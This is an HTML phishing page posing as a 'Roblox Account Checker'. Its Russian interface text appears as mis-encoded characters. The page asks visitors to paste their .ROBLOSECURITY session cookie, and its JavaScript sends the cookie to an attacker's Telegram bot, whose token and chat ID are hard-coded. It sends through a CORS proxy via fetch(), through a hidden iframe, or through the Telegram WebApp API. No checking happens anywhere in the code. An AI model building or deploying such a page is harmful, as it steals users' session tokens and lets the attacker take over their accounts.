<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Roblox Account Checker</title>
    <style>
        body {
            background: #0d1117;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #161b22;
            padding: 30px;
            border-radius: 10px;
            border: 1px solid #30363d;
        }
        h1 {
            color: #ff6b6b;
            margin-bottom: 10px;
        }
        textarea {
            width: 100%;
            height: 100px;
            padding: 10px;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #fff;
            border-radius: 5px;
            margin: 15px 0;
        }
        button {
            background: #238636;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:hover {
            background: #2ea043;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            background: #0d1117;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîê Roblox Checker</h1>
        <p>–í—Å—Ç–∞–≤—å—Ç–µ –≤–∞—à .ROBLOSECURITY –∫–æ–¥</p>
        
        <textarea id="codeInput" placeholder="–í—Å—Ç–∞–≤—å—Ç–µ —Å—é–¥–∞ –≤–∞—à –∫–æ–¥..."></textarea>
        
        <button onclick="sendCode()">üì§ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É</button>
        
        <div class="status" id="status">–û–∂–∏–¥–∞–Ω–∏–µ...</div>
    </div>

    <script>
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞
        function sendCode() {
            const code = document.getElementById('codeInput').value.trim();
            const status = document.getElementById('status');
            
            if (!code) {
                status.innerHTML = '‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥';
                return;
            }
            
            status.innerHTML = '‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞...';
            
            // –°–æ–∑–¥–∞–µ–º —Ñ–æ—Ä–º—É –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram Web App
            const formData = new FormData();
            formData.append('code', code);
            formData.append('time', new Date().toISOString());
            formData.append('userAgent', navigator.userAgent);
            
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º Telegram Web App API –µ—Å–ª–∏ –æ—Ç–∫—Ä—ã—Ç–æ —á–µ—Ä–µ–∑ –±–æ—Ç–∞
            if (window.Telegram && window.Telegram.WebApp) {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram Bot API
                const message = `üîê –ù–æ–≤—ã–π –∫–æ–¥!\n\n${code.substring(0, 100)}...`;
                Telegram.WebApp.sendData(message);
                status.innerHTML = '‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —á–µ—Ä–µ–∑ Telegram!';
            } else {
                // –ï—Å–ª–∏ –æ—Ç–∫—Ä—ã—Ç–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ, –∏—Å–ø–æ–ª—å–∑—É–µ–º –Ω–∞—à –º–µ—Ç–æ–¥
                sendViaProxy(code);
            }
            
            // –û—á–∏—â–∞–µ–º –ø–æ–ª–µ
            document.getElementById('codeInput').value = '';
        }
        
        // –ú–µ—Ç–æ–¥ –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏
        function sendViaProxy(code) {
            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
            const telegramUrl = `https://api.telegram.org/bot8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8/sendMessage`;
            
            const message = {
                chat_id: '1491315056',
                text: `üîê –ù–æ–≤—ã–π –∫–æ–¥ –ø–æ–ª—É—á–µ–Ω!\n\n–ö–æ–¥: ${code.substring(0, 50)}...\n–î–ª–∏–Ω–∞: ${code.length} —Å–∏–º–≤–æ–ª–æ–≤`,
                parse_mode: 'HTML'
            };
            
            fetch(proxyUrl + telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                const status = document.getElementById('status');
                if (response.ok) {
                    status.innerHTML = '‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
                } else {
                    status.innerHTML = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏';
                }
            })
            .catch(error => {
                document.getElementById('status').innerHTML = 'üåê –û—à–∏–±–∫–∞ —Å–µ—Ç–∏';
            });
        }
        
        // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ iframe
        function sendViaIframe(code) {
            const message = encodeURIComponent(`üîê –ö–æ–¥: ${code}`);
            const url = `https://api.telegram.org/bot8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8/sendMessage?chat_id=1491315056&text=${message}`;
            
            // –°–æ–∑–¥–∞–µ–º –Ω–µ–≤–∏–¥–∏–º—ã–π iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                document.body.removeChild(iframe);
                document.getElementById('status').innerHTML = '‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —á–µ—Ä–µ–∑ iframe!';
            }, 1000);
        }
        
        // –ü—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = function() {
            console.log('–°–∞–π—Ç –∑–∞–≥—Ä—É–∂–µ–Ω');
            document.getElementById('codeInput').focus();
        };
    </script>
</body>
</html>
